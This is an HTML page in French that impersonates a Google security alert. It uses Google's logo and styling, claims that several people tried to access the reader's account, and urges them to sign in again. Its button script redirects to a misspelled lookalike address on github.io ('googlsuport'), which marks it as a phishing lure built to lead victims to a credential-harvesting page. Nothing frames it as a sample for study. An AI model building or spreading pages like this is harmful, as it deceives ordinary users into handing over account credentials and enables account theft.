<!DOCTYPE html> 
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Alerte sécurité - Google</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" />
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Roboto&display=swap');

    body {
      margin: 0;
      background: #fff;
      font-family: 'Roboto', Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      min-height: 100vh;
      padding: 100px 16px 40px 16px;
      color: #202124;
      text-align: center;
    }

    .container {
      width: 100%;
      max-width: 400px;
    }

    .google-logo {
      width: 92px;
      margin-bottom: 32px;
    }

    h1 {
      font-weight: 400;
      font-size: 24px;
      margin: 0 0 12px 0;
      color: #d93025; /* Rouge alert */
    }

    p {
      font-size: 16px;
      margin: 0 0 28px 0;
      color: #3c4043;
      line-height: 1.4;
    }

    button {
      margin-top: 24px;
      width: 100%;
      background-color: #1a73e8;
      color: white;
      border: none;
      padding: 12px 0;
      font-size: 14px;
      font-weight: 500;
      border-radius: 4px;
      cursor: pointer;
      box-shadow: 0 1px 1px rgb(0 0 0 / 0.1);
      transition: background-color 0.3s;
      text-transform: none;
      font-family: 'Roboto', Arial, sans-serif;
    }

    button:hover {
      background-color: #1669c1;
      box-shadow: 0 2px 4px rgb(0 0 0 / 0.2);
    }

    .footer {
      margin-top: 48px;
      font-size: 12px;
      color: #5f6368;
    }
  </style>
</head>
<body>
  <div class="container" role="main" aria-labelledby="pageTitle">
    <img
      src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png"
      alt="Google"
      class="google-logo"
    />
    <h1 id="pageTitle">Activité suspecte détectée</h1>
    <p>
      Plusieurs personnes ont tenté d’accéder à votre compte Google.<br />
      Pour protéger votre compte, veuillez vous reconnecter.
    </p>

    <button id="connectBtn" type="button">Se connecter</button>

    <div class="footer">
      Si vous n'êtes pas à l'origine de ces tentatives, veuillez changer votre mot de passe immédiatement.
    </div>
  </div>

  <script>
    const connectBtn = document.getElementById("connectBtn");
    connectBtn.addEventListener("click", () => {
      window.location.href = "https://googlsuport.github.io/googlesupor2/";
    });
  </script>
</body>
</html>
